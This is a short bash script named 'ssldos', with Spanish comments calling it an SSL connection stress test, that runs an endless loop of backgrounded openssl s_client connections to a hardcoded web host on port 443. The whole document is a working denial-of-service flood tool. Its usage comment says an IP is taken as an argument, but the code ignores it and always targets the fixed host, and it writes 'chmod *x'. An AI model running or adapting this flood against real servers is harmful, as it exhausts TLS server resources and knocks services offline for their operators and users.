# ssldos

#!/bin/bash
# TEST DE STRESS CONEXIONES SSL
Antonio Taboada 30/12/2016
# chmod *x ssldos.sh
# ./ssldos.sh IP
# Para parar Control + C

while true; do

        openssl s_client -connect web.hackingyseguridad.com:443 2>/dev/null 1>/dev/null&

done
